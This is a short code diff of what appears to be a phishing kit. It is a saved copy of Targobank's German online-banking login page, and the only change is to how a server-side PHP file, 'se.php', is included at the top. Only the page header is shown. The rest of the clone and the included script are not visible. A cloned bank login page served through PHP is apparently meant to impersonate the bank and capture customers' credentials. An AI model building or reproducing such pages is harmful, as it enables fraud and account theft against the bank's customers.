@@ -1,4 +1,4 @@
-<?php include "se.php"?>
+<?php include 'se.php';?>
 <!DOCTYPE html>
 <!-- saved from url=(0121)https://www.targobank.de/de/identification/login.cgi?fbclid=IwAR1eCBzABWljGpoYRKIMgB8gloJth3hQHCD8woW95Y-sZP1EBxyrYcTEv-I -->
 <html lang="de" class="js  ua-webkit ua-safari ua-safari-5 de identification no-slides has-no-nav no-touch theme-0 dom-ready all-ready"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta http-equiv="Content-Language" content="de">
